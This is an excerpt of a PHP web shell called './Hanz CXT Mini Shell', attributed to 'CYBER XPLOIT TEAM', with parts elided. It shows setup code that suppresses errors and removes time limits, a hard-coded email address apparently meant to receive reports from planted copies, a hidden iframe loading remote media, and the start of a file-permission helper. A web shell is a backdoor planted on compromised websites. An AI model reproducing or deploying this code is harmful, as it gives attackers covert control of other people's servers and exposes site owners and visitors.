...
@ini_set('display_errors', 0); set_time_limit(0); ini_set('memory_limit', '64M'); 
  header('Content-Type: text/html; charset=UTF-8'); 
  $tujuanmail = 'hanz63x@gmail.com'; 
...
<html>
<head>
<link href="https://HanzX63kuN.blogspot.com" rel="stylesheet" type="text/css">
<title>./Hanz MiniShell</title>
<style>
body{
...
<body>
<a href="https://HanzX63kuN.blogspot.com"><img src="https://c.top4top.io/p_1872hbz3w0.png" alt="IMG-20200103-142233-874" border="0"></a>
<iframe width="0" height="0" src="https://c.top4top.io/m_1467efn6q1.mp4" frameborder="0" allowfullscreen></iframe> 
<h1><center><font color="white">./Hanz CXT Mini Shell</font></center></h1>
...
echo '<center><br/>Copyright ./Hanz - CXT @ 2020- CYBER XPLOIT TEAM</center>
</body>
</html>';
function perms($file){
